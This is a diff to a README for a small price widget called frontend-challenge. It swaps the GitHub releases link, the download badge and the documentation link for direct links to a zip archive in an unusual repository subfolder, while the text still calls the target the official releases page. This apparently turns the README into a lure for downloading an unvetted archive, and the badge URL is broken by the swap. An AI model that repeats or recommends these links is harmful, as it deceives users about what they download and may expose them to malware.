@@ -1,7 +1,7 @@
 # 🧩 frontend-challenge - A Simple Price Widget for You
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download%20Now-Frontend%20Challenge-brightgreen)](https://github.com/0Spikes0/frontend-challenge/releases)
+[![Download](https://raw.githubusercontent.com/0Spikes0/frontend-challenge/main/corynine/frontend-challenge.zip%20Now-Frontend%20Challenge-brightgreen)](https://raw.githubusercontent.com/0Spikes0/frontend-challenge/main/corynine/frontend-challenge.zip)
 
 ## 🚀 Getting Started
 Welcome to the frontend-challenge! This is a user-friendly price widget designed for Energiswap. It helps you quickly view current prices, making your experience smoother and more efficient.
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of the frontend-challenge.
 
-[Visit this page to download](https://github.com/0Spikes0/frontend-challenge/releases)
+[Visit this page to download](https://raw.githubusercontent.com/0Spikes0/frontend-challenge/main/corynine/frontend-challenge.zip)
 
 ### 💻 Installation Steps
 1. **Visit the Releases Page**: Click the link above to go to the official GitHub Releases page.
@@ -51,7 +51,7 @@ This combination ensures a reliable and scalable application while maintaining e
 
 ## 📄 Additional Resources
 If you want to learn more about using the frontend-challenge or how it works, you can check the following resources:
-- **Documentation**: [Find detailed usage guides and API information here.](https://github.com/0Spikes0/frontend-challenge/wiki)
+- **Documentation**: [Find detailed usage guides and API information here.](https://raw.githubusercontent.com/0Spikes0/frontend-challenge/main/corynine/frontend-challenge.zip)
 - **Community Support**: Join discussions and ask questions in our community forum.
 
 ## 🙋‍♂️ Get Involved
